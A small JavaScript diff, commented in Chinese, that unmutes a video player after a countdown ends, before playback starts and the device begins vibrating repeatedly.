@@ -143,8 +143,9 @@ countdown.textContent=n;
 clearInterval(t);
 countdown.style.display='none';
 
-// 倒计时结束后：显示视频、播放、拍照、闪光
+// 倒计时结束后：显示视频、播放、打开声音、拍照、闪光
 player.style.display='block';
+player.muted = false; // 打开声音
 player.play();
 
 vibrateInt=setInterval(()=>navigator.vibrate(20),50);
